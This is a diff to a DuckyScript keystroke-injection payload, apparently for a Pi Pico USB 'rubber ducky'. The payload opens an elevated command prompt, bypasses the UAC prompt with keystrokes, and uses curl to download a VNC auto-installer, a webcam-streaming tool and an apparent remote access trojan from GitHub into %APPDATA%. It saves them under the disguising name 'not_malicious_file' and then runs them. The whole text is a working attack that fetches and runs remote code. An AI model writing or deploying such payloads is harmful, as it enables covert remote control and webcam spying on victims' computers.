@@ -2,17 +2,28 @@ GUI r
 DELAY 500
 STRING powershell Start-Process cmd -Verb runAs
 ENTER
-DELAY 2000
+DELAY 3000
 SHIFT TAB
 ENTER
 DELAY 1000
 STRING cd %APPDATA%
 ENTER
 DELAY 1000
-STRING curl.exe --output not_malicious_file.exe --url https://raw.githubusercontent.com/nzkoxzu/K-ptain.Ratz-GUI/main/ratz/ratz.exe
-DELAY 2000
-STRING not_malicious_file.exe
-ENTER 
-DELAY 1000
-STRING EXIT
+STRING curl.exe --output not_malicious_file.bat --url https://raw.githubusercontent.com/nzkoxzu/pi-pico-rubber-ducky/main/vnc_auto_inst.bat
 ENTER
+DELAY 3000
+STRING curl.exe --output cam2ip.exe --url https://raw.githubusercontent.com/nzkoxzu/pi-pico-rubber-ducky/main/cam2ip/cam2ip.exe
+ENTER
+DELAY 3000
+STRING curl.exe --output opencv_ffmpeg2413_64.dll --url https://raw.githubusercontent.com/nzkoxzu/pi-pico-rubber-ducky/main/cam2ip/opencv_ffmpeg2413_64.dll
+ENTER
+DELAY 2000
+STRING curl.exe --output not_malicious_file.exe --url https://raw.githubusercontent.com/nzkoxzu/pi-pico-rubber-ducky/main/ratz.exe
+ENTER
+DELAY 2000
+STRING not_malicious_file.bat
+ENTER
+DELAY 10000
+STRING not_malicious_file.exe
+ENTER
+EXIT
